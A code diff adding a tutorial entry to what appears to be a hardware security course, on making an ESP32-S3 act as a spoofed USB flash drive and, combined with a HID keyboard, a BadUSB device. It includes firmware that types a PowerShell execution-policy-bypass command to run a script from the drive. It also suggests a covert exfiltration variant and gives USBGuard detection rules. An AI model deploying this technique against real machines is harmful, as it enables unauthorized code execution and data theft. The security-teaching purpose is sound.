@@ -573,4 +573,82 @@ window.SignalGuides = {
         ]
     }
 
+},
+
+    // ========================================================================
+    // SG-97: USB Mass Storage Emulation
+    // ========================================================================
+    'sg-97': {
+        intro: '<p>The ESP32-S3 can present itself as a USB flash drive. When plugged into a computer, the host sees a removable storage device and can read files from it. Combined with the HID keyboard from SG-94, this creates a powerful combination: the device types commands that reference files on its own "USB drive."</p>' +
+               '<p>This project uses TinyUSB Mass Storage Class (MSC) to serve files from the ESP32-S3 SPIFFS flash or an external microSD card. You will build a file server, a payload delivery system, and understand how BadUSB attacks combine HID and mass storage for maximum impact.</p>' +
+               '<p>The defense perspective: understanding how a single USB device can simultaneously be a keyboard AND a flash drive is essential for building USB security policies that actually work.</p>',
+
+        wiring: '    T-Display-S3 + MicroSD Breakout (optional)\n\n    If using SD card:\n    SD Module    T-Display-S3\n    VCC  ------> 3V3\n    GND  ------> GND\n    MISO ------> GPIO 13\n    MOSI ------> GPIO 11\n    SCK  ------> GPIO 12\n    CS   ------> GPIO 10',
+
+        wiringNotes: '<p><strong>SD card is optional.</strong> Without it, the ESP32-S3 serves files from its internal SPIFFS flash (~4MB usable). With a microSD card, you get more storage and can swap cards between projects.</p>' +
+                     '<p><strong>Safety:</strong> Disconnect USB before wiring the SD breakout. The SD module runs on 3.3V &mdash; do not connect to 5V.</p>' +
+                     '<p><strong>Authorization:</strong> A device that presents as a USB flash drive can auto-deliver files to a target. Only deploy in authorized testing scenarios. Auto-run is disabled on modern operating systems but social engineering ("open the file") remains effective.</p>',
+
+        wiringSvg: '',
+
+        steps: [
+            {
+                title: 'TinyUSB Mass Storage Setup',
+                content: '<p>Configure the ESP32-S3 to present as a USB mass storage device using TinyUSB. The host computer will see a new removable drive.</p>',
+                code: '#include "USB.h"\n#include "USBMSC.h"\n#include <SPIFFS.h>\n#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBMSC msc;\n\n// SPIFFS-backed mass storage callbacks\nstatic int32_t onRead(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {\n    // Read from SPIFFS image\n    // In production, this maps LBA to a disk image file\n    memset(buffer, 0, bufsize);\n    return bufsize;\n}\n\nstatic int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {\n    // Write to SPIFFS image (read-only for safety)\n    return bufsize;  // Accept but discard writes\n}\n\nstatic bool onStartStop(uint8_t power, bool start, bool loadEject) {\n    if (loadEject) {\n        // Host ejected the drive\n        tft.setCursor(5, 150);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.println("Drive ejected by host");\n    }\n    return true;\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    tft.fillScreen(TFT_BLACK);\n    \n    SPIFFS.begin(true);\n    \n    // Configure MSC\n    msc.vendorID("HEXWRTH");\n    msc.productID("S3-ARSENAL");\n    msc.productRevision("1.0");\n    msc.onRead(onRead);\n    msc.onWrite(onWrite);\n    msc.onStartStop(onStartStop);\n    msc.mediaPresent(true);\n    msc.begin(4096, 512);  // 4096 blocks x 512 bytes = 2MB drive\n    \n    USB.begin();\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(10, 20);\n    tft.println("USB STORAGE");\n    tft.setTextSize(1);\n    tft.setCursor(10, 60);\n    tft.println("Host sees: HEXWRTH S3-ARSENAL");\n    tft.println("Size: 2MB removable drive");\n    tft.println("Mode: Read-only");\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 110);\n    tft.println("Status: MOUNTED");\n}',
+                language: 'C++',
+                tip: '<strong>vendorID and productID</strong> are the strings the host shows in Device Manager / lsusb. You can set these to anything &mdash; including mimicking a legitimate USB drive brand. This is how malicious USB devices evade detection by appearing as known-good hardware.'
+            },
+            {
+                title: 'Composite Device — HID + Mass Storage',
+                content: '<p>The real power: present as BOTH a keyboard AND a flash drive simultaneously. The keyboard types commands that reference files on the drive. This is the BadUSB technique used by professional assessment tools.</p>' +
+                         '<p>Example: the keyboard opens PowerShell, the command reads a script from the USB drive, and executes it &mdash; all in under 3 seconds.</p>',
+                code: '#include "USB.h"\n#include "USBMSC.h"\n#include "USBHIDKeyboard.h"\n\nUSBMSC msc;\nUSBHIDKeyboard Keyboard;\n\n// Initialize both USB classes\nvoid setup() {\n    // ... display init ...\n    \n    // Setup MSC (flash drive)\n    msc.vendorID("LEXAR");\n    msc.productID("USB3.0");\n    msc.productRevision("2.0");\n    msc.onRead(onRead);\n    msc.onWrite(onWrite);\n    msc.mediaPresent(true);\n    msc.begin(4096, 512);\n    \n    // Setup HID (keyboard)\n    Keyboard.begin();\n    \n    // Start composite USB device\n    USB.begin();\n    // Host now sees: 1 keyboard + 1 removable drive\n    \n    tft.setCursor(10, 80);\n    tft.println("Composite device active:");\n    tft.println("  [1] USB Keyboard (HID)");\n    tft.println("  [2] USB Drive (MSC)");\n    tft.println("");\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.println("Both active simultaneously");\n}\n\n// Example composite attack payload:\n// 1. Keyboard opens Run dialog\n// 2. Keyboard types command to execute script from the USB drive\n// 3. Script runs with logged-in user privileges\nvoid compositePayload() {\n    delay(2000);  // Wait for drive to mount\n    \n    // Open PowerShell\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(\'r\');\n    Keyboard.releaseAll();\n    delay(500);\n    \n    // Execute script from the USB drive\n    // The drive letter varies — a real tool would detect it\n    Keyboard.println("powershell -ep bypass -file D:\\\\payload.ps1");\n}',
+                language: 'C++',
+                tip: '<strong>Composite USB devices</strong> present multiple interfaces simultaneously. One USB connector, multiple device classes. The host sees each interface as a separate device. This is standard USB behavior &mdash; many legitimate devices do this (keyboard + media keys, printer + scanner). The security implication: you cannot trust a USB device to be ONLY what it claims to be.'
+            },
+            {
+                title: 'Defense: Detecting Composite USB Devices',
+                content: '<p>Teach the defense alongside the technique. How to detect a suspicious USB device that presents as both a keyboard and a storage device:</p>' +
+                         '<ul>' +
+                         '<li><strong>USB descriptor inspection:</strong> Real flash drives have 1 interface (MSC). A composite HID+MSC device has 2+ interfaces. This is abnormal for a "flash drive."</li>' +
+                         '<li><strong>USBGuard rules:</strong> On Linux, block devices with multiple interface classes unless whitelisted.</li>' +
+                         '<li><strong>Windows Group Policy:</strong> Restrict removable storage AND require known HID device VID/PID.</li>' +
+                         '<li><strong>Endpoint detection:</strong> EDR agents can detect new HID devices and correlate with mass storage events.</li>' +
+                         '</ul>',
+                code: '# Linux: Detect composite USB devices\n# List all USB devices and their interface classes:\nlsusb -v 2>/dev/null | grep -A 5 "bInterfaceClass"\n\n# A legitimate flash drive shows:\n#   bInterfaceClass  8 Mass Storage\n# A suspicious composite device shows:\n#   bInterfaceClass  3 Human Interface Device\n#   bInterfaceClass  8 Mass Storage\n\n# USBGuard rule to block composite HID+MSC:\n# /etc/usbguard/rules.conf\nblock with-interface one-of { 03:*:* 08:*:* }  # Block HID+MSC combo\nallow with-interface equals { 08:*:* }          # Allow pure MSC\nallow with-interface equals { 03:01:01 }        # Allow standard keyboards',
+                language: 'Bash',
+                tip: '<strong>The detection principle:</strong> legitimate USB flash drives never have a HID interface. Legitimate keyboards never have an MSC interface. A device with both is either a specialized tool (security assessment device) or malicious. Flag and investigate.'
+            }
+        ],
+
+        testing: '<p>Verify:</p>' +
+                 '<ul>' +
+                 '<li><strong>Mass Storage:</strong> Plug in the board. A new removable drive appears in File Explorer (Windows) or Finder (macOS). It should show as "HEXWRTH S3-ARSENAL".</li>' +
+                 '<li><strong>Composite mode:</strong> Device Manager shows both "HID Keyboard" and "USB Mass Storage" from the same device.</li>' +
+                 '<li><strong>Read-only:</strong> Try to write a file to the drive. It should fail or silently discard the write.</li>' +
+                 '<li><strong>Eject detection:</strong> Safely eject the drive from the host. The display should show "Drive ejected by host".</li>' +
+                 '<li><strong>Linux detection:</strong> Run <code>lsusb -v</code> and verify you can see both interface classes on the device.</li>' +
+                 '</ul>',
+
+        troubleshooting: '<ul>' +
+                         '<li><strong>Drive not appearing on host:</strong> Make sure <code>msc.mediaPresent(true)</code> is called before <code>msc.begin()</code>. Without it, the host sees an empty drive bay.</li>' +
+                         '<li><strong>Drive appears but is 0 bytes:</strong> Check the block count and block size in <code>msc.begin(blocks, blockSize)</code>. The total size is blocks x blockSize.</li>' +
+                         '<li><strong>Cannot use HID and MSC simultaneously:</strong> Both must be initialized before <code>USB.begin()</code>. Starting USB before adding all classes will not work.</li>' +
+                         '<li><strong>Host assigns wrong drive letter:</strong> The drive letter is assigned by the host OS. You cannot control it from the device. Your payload must either detect the drive letter or use a path-independent method.</li>' +
+                         '</ul>',
+
+        challenges: '<p><strong>Challenge 1: FAT12 Filesystem</strong> &mdash; Implement a minimal FAT12 filesystem in the read callback so the host sees actual files (README.txt, payload.ps1) instead of raw blocks. This is how commercial BadUSB devices serve files.</p>' +
+                    '<p><strong>Challenge 2: Exfiltration Drive</strong> &mdash; In write mode, accept files written by the host and store them in SPIFFS or SD card. This turns the device into a covert data exfiltration tool. Discuss the defense: USB DLP (Data Loss Prevention) policies.</p>' +
+                    '<p><strong>Challenge 3: Auto-Detect Drive Letter</strong> &mdash; When the HID keyboard opens a command prompt, use a script that finds the correct drive letter by looking for your device vendor string in <code>wmic logicaldisk</code> output. This makes the payload portable across any machine.</p>',
+
+        stepVisuals: {},
+        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'ESP32-S3 native USB presents as Mass Storage Class device. SPIFFS flash stores files served to the host. Combined with HID for composite BadUSB technique.', specs: ['TinyUSB MSC Class 0x08', 'SPIFFS: ~4MB', 'Composite: HID + MSC', 'Custom VID/PID'] }, { id: 'sd-breakout', name: 'MicroSD Breakout (Optional)', purpose: 'Adds removable storage for larger payloads and file delivery. SPI interface to ESP32-S3.', specs: ['SPI interface', '3.3V only', 'FAT32 format', '~$3'] }] },
+        commonMistakes: [
+            { title: 'Connecting SD Module to 5V', correct: 'Connect SD breakout VCC to the 3.3V pin on the T-Display-S3. SD cards operate at 3.3V logic levels.', incorrect: 'Connecting SD module VCC to 5V or VBUS.', consequence: 'The SD card and/or the level shifter on the breakout board can be permanently damaged. Some modules have onboard regulators that tolerate 5V, but many do not. Always check the module datasheet.' },
+            { title: 'Initializing USB After Adding Only One Class', correct: 'Initialize ALL USB classes (HID, MSC, etc.) BEFORE calling <code>USB.begin()</code>. The USB stack configures all descriptors at begin() time.', incorrect: 'Calling <code>USB.begin()</code> after setting up MSC, then trying to add HID later.', consequence: 'The second USB class is not registered in the USB descriptors. The host only sees the first class. No error is thrown &mdash; the second class silently fails.' },
+            { title: 'Setting Drive to Read-Write Without Understanding the Risk', correct: 'Start with read-only mode. Only enable writes when you have a specific, authorized reason (e.g., testing USB DLP policies). Log all write operations.', incorrect: 'Setting the drive to read-write by default and allowing arbitrary file writes to the ESP32-S3 storage.', consequence: 'The host OS (or malware on the host) writes to your device, potentially corrupting SPIFFS, filling flash storage, or overwriting your payload files.' }
+        ]
+    }
+
 };
